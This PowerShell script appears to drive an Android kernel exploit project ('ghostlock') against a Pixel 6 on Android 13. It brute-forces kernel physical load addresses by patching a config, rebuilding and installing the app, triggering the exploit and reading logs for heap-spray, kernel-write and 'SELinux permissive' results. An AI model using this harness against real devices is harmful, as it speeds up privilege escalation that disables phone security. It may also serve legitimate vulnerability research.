# P6 kernel_phys_load scan driver
# Usage: powershell -File tools\trials\p6_phys_scan.ps1 -Candidates 0x98000000,0xA0000000,...
param(
    [string]$Dev = "22251FDF60004E",
    [string[]]$Candidates = @(),
    [int]$SettleSec = 35
)
if (-not $Candidates -or $Candidates.Count -eq 0) {
    $Candidates = (Get-Content "build\oriole\scan-cands.txt") -split ","
}
$ErrorActionPreference = "Continue"
Set-Location "D:\work\1\ghostlock-main"
$env:PATH = "D:\platform\Android\Sdk\platform-tools;D:\platform\Git\cmd;D:\platform\Git\usr\bin;C:\Users\Administrator\.cargo\bin;" + (($env:PATH -split ';') | Where-Object { $_ -notmatch 'mise' }) -join ';'
$conf = "app\src\main\assets\kernel_profiles\5.10.157-android13-4-00003-g776d0a76f6aa-ab10208116.conf"
$out = "build\oriole\scan-results.txt"

function Wait-Boot {
    param([string]$Dev)
    for ($i = 0; $i -lt 60; $i++) {
        $st = adb -s $Dev get-state 2>&1
        if ("$st".Trim() -eq "device") {
            $bc = adb -s $Dev shell getprop sys.boot_completed 2>&1
            if ("$bc".Trim() -eq "1") { return $true }
        }
        Start-Sleep 3
    }
    return $false
}

function Invoke-Run {
    param([string]$Dev)
    # fire run, wait, classify
    adb -s $Dev shell am force-stop com.ghostlock.app | Out-Null
    Start-Sleep 2
    adb -s $Dev shell am start -n com.ghostlock.app/.ui.MainActivity | Out-Null
    Start-Sleep 8
    # tap with retry until native log mtime changes
    $before = adb -s $Dev shell "run-as com.ghostlock.app stat -c %Y files/.ghostlock_native.log" 2>&1
    for ($t = 0; $t -lt 4; $t++) {
        adb -s $Dev shell input tap 540 2176 | Out-Null
        Start-Sleep 10
        $after = adb -s $Dev shell "run-as com.ghostlock.app stat -c %Y files/.ghostlock_native.log" 2>&1
        if ("$after".Trim() -ne "$before".Trim()) { break }
    }
    Start-Sleep $SettleSec
    $alive = $true
    adb -s $Dev shell "echo alive" 2>&1 | ForEach-Object { if ($_ -notmatch "alive") { $alive = $false } }
    if (-not $alive) { return "OOPS-REBOOT" }
    $log = adb -s $Dev shell "run-as com.ghostlock.app cat files/.ghostlock_native.log" 2>&1 | Out-String
    if ($log -match "SELinux permissive") { return "HIT-W1" }
    if ($log -match "Write 1 failed") { return "CLEAN-MISS" }
    if ($log -match "heap spray done") { return "STUCK-MID" }
    return "NO-RUN"
}

foreach ($cand in $Candidates) {
    $val = if ($cand -match "^0x") { [Convert]::ToInt64($cand, 16) } else { [int64]$cand }
    "$(Get-Date -Format HH:mm:ss) candidate 0x{0:X} ({0})" -f $val | Tee-Object -FilePath $out -Append
    # patch profile
    $raw = Get-Content $conf -Raw
    $raw = $raw -replace "kernel_phys_load = \d+", "kernel_phys_load = $val"
    Set-Content -Path $conf -Value $raw -NoNewline
    # build + install
    $null = & .\gradlew.bat :app:assembleDebug -x buildGhostlockNative --no-configuration-cache 2>&1 | Select-Object -Last 1
    $apk = Get-ChildItem "build\app\outputs\apk\debug\*.apk" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    $null = adb -s $Dev install -r "$($apk.FullName)" 2>&1 | Select-String "Success"
    # fire
    adb -s $Dev shell am force-stop com.ghostlock.app | Out-Null
    Start-Sleep 2
    adb -s $Dev shell am start -n com.ghostlock.app/.ui.MainActivity | Out-Null
    Start-Sleep 8
    $before = adb -s $Dev shell "run-as com.ghostlock.app stat -c %Y files/.ghostlock_native.log" 2>&1
    for ($t = 0; $t -lt 4; $t++) {
        adb -s $Dev shell input tap 540 2176 | Out-Null
        Start-Sleep 10
        $after = adb -s $Dev shell "run-as com.ghostlock.app stat -c %Y files/.ghostlock_native.log" 2>&1
        if ("$after".Trim() -ne "$before".Trim()) { break }
    }
    Start-Sleep $SettleSec
    $verdict = "UNKNOWN"
    $alive = $true
    adb -s $Dev shell "echo alive" 2>&1 | ForEach-Object { if ($_ -notmatch "alive") { $alive = $false } }
    if (-not $alive) {
        $verdict = "OOPS-REBOOT"
        Wait-Boot -Dev $Dev | Out-Null
        Start-Sleep 15
    } else {
        $log = adb -s $Dev shell "run-as com.ghostlock.app cat files/.ghostlock_native.log" 2>&1 | Out-String
        if ($log -match "candidate is EXACT") { $verdict = "ORACLE-HIT" } elseif ($log -match "SELinux permissive") { $verdict = "HIT-W1" }
        elseif ($log -match "candidate missed") { $verdict = "ORACLE-MISS" }
        elseif ($log -match "heap spray done") { $verdict = "STUCK-MID" }
        else { $verdict = "NO-RUN" }
    }
    $resolved = ""
    if ($log -match "kernel_phys_load=0x([0-9a-f]+)") { $resolved = $Matches[1] }
    "$(Get-Date -Format HH:mm:ss) => $verdict (resolved 0x$resolved)" | Tee-Object -FilePath $out -Append
    if ($verdict -eq "ORACLE-HIT") { "=== HIT at 0x{0:X} â€?stopping ===" -f $val | Tee-Object -FilePath $out -Append; break }
}
"scan done" | Tee-Object -FilePath $out -Append
